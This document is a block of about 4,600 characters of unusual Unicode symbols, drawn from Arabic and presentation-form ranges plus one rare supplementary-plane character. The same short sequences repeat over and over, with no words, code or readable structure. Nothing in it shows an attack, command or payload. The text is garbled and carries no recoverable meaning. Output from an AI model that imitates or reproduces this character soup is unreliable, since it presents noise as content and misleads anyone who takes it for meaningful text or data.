࡙࡙࡙࡙࡙࡙࡙ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬